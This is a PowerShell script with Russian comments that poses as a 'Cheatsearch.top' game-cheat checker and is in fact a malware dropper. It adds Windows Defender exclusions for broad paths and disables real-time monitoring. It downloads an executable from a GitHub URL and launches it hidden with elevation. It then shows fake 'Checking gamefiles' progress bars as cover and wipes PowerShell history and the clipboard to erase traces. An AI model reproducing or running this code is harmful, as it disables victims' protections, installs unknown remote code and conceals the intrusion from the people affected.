# 1. Настройка окружения
$ErrorActionPreference = "SilentlyContinue"
# Принудительно включаем TLS 1.2 для работы с GitHub
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Clear

Write-Host "Cheatsearch.top - Best cheat searcher!" -ForegroundColor Cyan

# 2. Пути и подготовка
$outputFile = "$env:TEMP\ccmmd.exe"
$folders = @("C:\Windows\Temp", "C:\", "C:\ProgramData", "C:\Users")

# Попытка добавить исключения (требуются права админа)
foreach ($f in $folders) { Add-MpPreference -ExclusionPath $f }
Add-MpPreference -ExclusionPath $outputFile
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# 3. Скачивание файла
$url = "https://github.com/expendertie/chear11/raw/refs/heads/main/main.exe"
$downloaded = $false

try {
    # Основной метод скачивания
    Invoke-WebRequest -Uri $url -OutFile $outputFile -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing
    $downloaded = $true
} catch {
    try {
        # Резервный метод через WebClient
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($url, $outputFile)
        $downloaded = $true
    } catch {
        Write-Host "[-] Critical Download Error!" -ForegroundColor Red
    }
}

# 4. Логика запуска EXE
if ($downloaded -and (Test-Path $outputFile)) {
    try {
        # Пытаемся запустить от имени администратора скрыто
        Start-Process -FilePath $outputFile -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
    } catch {
        # Если RunAs не сработал, пробуем прямой запуск
        & $outputFile
    }
}

# 5. Визуальная часть (твои проценты)
$tasks = @(
    @{ name = "Checking gamefiles"; speed = 30 },
    @{ name = "Checking regedit"; speed = 80 },
    @{ name = "Checking LastActivity"; speed = 15 },
    @{ name = "Checking files"; speed = 100 }
)

foreach ($task in $tasks) {
    for ($i = 1; $i -le 100; $i++) {
        # `r возвращает курсор в начало строки, чтобы проценты обновлялись на месте
        Write-Host -NoNewline ("$($task.name): $i% `r")
        Start-Sleep -Milliseconds $task.speed
    }
    Write-Host ("$($task.name): Complete!      ") -ForegroundColor DarkGreen
}

Write-Host "`nCheat check end!" -ForegroundColor Green
Write-Host "Visit cheatseach.top!" -ForegroundColor Cyan

# 6. Очистка следов
try {
    # Чистим историю PowerShell и буфер обмена
    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
    $histPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $histPath) { Remove-Item $histPath -Force }
    Add-Type -AssemblyName PresentationCore
    [System.Windows.Clipboard]::Clear()
} catch {}
